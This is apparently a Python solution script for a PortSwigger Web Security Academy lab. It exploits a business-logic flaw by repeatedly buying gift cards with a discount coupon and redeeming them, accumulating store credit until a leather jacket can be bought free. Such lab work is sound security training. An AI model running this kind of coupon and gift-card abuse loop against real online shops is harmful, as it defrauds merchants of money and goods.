import requests
import re
from bs4 import BeautifulSoup

# NOTE: Change this address
URL = "https://ac521fa21f75933ec018087300490037.web-security-academy.net"
proxies = {
	"http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080",
}

def getCsrf(text):
    soup = BeautifulSoup(text, 'html.parser')
    csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
    print(f"[+] CSRF Token: {csrfToken}")
    return csrfToken

# To intercept requesst in burp, export the following:
     # export REQUESTS_CA_BUNDLE="/path/to/pem/encoded/cert"
     # export REQUESTS_CA_BUNDLE="/home/vlaghe/proj/sec/burp_labs/burp.pem"
     # export HTTP_PROXY="http://127.0.0.1:8080"
     # export HTTPS_PROXY="http://127.0.0.1:8080"

# Session setup
s = requests.Session()
s.proxies = proxies

# Login
r = s.get(URL + "/login")
login_data = {
    "csrf": getCsrf(r.text),
    "username": "wiener",
    "password": "peter"
}
s.post(URL+"/login", data=login_data)
r = s.get(URL + "/login")
token = getCsrf(r.text)


while True:
    # Buy gift cards
    data = {
        "productId": 2,
        "redir": "PRODUCT",
        "quantity": "10"
    }
    s.post(URL + "/cart", data=data)
    print(f"Adding 10 gift cards & applying coupon ...")

    # Apply coupon
    coupon = "SIGNUP30"
    r = s.post(URL + "/cart/coupon", data={"csrf": token, "coupon": coupon})
    # print(r.text)

    # Place order
    s.post(URL + "/cart/checkout", allow_redirects=False, data={'csrf': token})
    r = s.get(URL + "/cart/order-confirmation?order-confirmed=true")
    # print(r.text)

    # Redem them
    soup = BeautifulSoup(r.text, "lxml")
    table = soup.find(class_="is-table-numbers")
    gift_cards= [g.text for g in table.tbody.find_all('td')]
    print(f"Gift cards: {gift_cards}")

    print(f"Reedeming them...")
    for card in gift_cards:
        s.post(URL + "/gift-card", data={"csrf": token, "gift-card": card})

    r = s.get(URL + "/cart")
    price = re.findall(r"\$([0-9,]*\.[0-9]*)", r.text)[0]
    print(f"${price}")

    # Repeat until you have enough to buy a lether jacket
    if float(price) > 1400:
        print(f"Buying a lether jacket for free :O")
        break


